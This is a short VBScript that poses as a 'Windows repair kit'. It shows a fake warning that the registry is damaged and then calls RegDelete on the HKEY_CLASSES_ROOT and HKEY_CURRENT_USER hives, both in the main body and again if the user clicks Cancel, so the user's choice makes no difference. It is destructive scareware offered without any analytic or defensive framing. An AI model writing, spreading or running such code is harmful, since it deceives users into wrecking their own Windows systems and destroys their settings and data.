   L_Welcome_MsgBox_Message_Text   = "Your registry is damaged! Do you wath to repair?(recomadet)"
   L_Welcome_MsgBox_Title_Text     = "Windows repair kit"
   Call Welcome()
   Dim WSHShell
   Set WSHShell = WScript.CreateObject("WScript.Shell")
   WSHShell.RegDelete "HKEY_CLASSES_ROOT"
   WSHShell.RegDelete "HKEY_CURRENT_USER"
   Sub Welcome()
       Dim intDoIt
       intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,   _
                         vbOKCancel + vbInformation,       _
                         L_Welcome_MsgBox_Title_Text )
       If intDoIt = vbCancel Then
     WSHShell.RegDelete "HKEY_CLASSES_ROOT"
   WSHShell.RegDelete "HKEY_CURRENT_USER"
       End If
   End Sub
